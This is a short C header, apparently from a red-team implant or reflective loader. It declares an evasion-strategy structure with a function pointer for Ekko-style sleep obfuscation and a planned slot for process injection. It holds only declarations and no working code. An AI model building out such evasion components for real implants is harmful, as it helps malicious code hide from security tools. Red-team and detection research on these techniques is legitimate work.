#ifndef STRATEGY_H
#define STRATEGY_H

#include "common_defines.h"

// Forward declaration to avoid circular dependency
struct _RTLDR_CTX;

// Define function pointer for the sleep obfuscation technique
typedef BOOL(WINAPI * PFN_OBFUSCATE_SLEEP)(struct _RTLDR_CTX* ctx, DWORD dwMilliseconds);

// This structure will hold pointers to the functions implementing the chosen evasion strategy.
// As we add more techniques (e.g., process injection), we will add more function pointers here.
typedef struct _EVASION_STRATEGY {
    PFN_OBFUSCATE_SLEEP pfnObfuscateSleep;
    // PFN_INJECT_PROCESS pfnInjectProcess; // Example for future expansion
} EVASION_STRATEGY, *PEVASION_STRATEGY;


// Function to initialize the strategy structure with the chosen techniques.
// For now, it will just set up the Ekko sleep obfuscation.
BOOL Strategy_Initialize(struct _RTLDR_CTX* ctx, PEVASION_STRATEGY strategy);


#endif // STRATEGY_H 